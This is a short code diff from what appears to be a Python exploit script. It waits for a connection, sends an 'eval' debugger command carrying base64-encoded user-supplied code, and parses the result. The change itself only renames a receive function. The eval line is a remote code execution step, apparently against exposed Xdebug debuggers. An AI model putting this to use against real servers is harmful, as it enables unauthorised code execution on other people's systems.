@@ -59,7 +59,7 @@ if __name__ == '__main__':
     conn, addr = sk.accept()
     conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))
 
-    data = recvall(conn)
+    data = recv_xml(conn)
     g = re.search(rb'<\!\[CDATA\[([a-z0-9\./\+]+)\]>', data, re.I)
     if not g:
         print('[-] No result...')
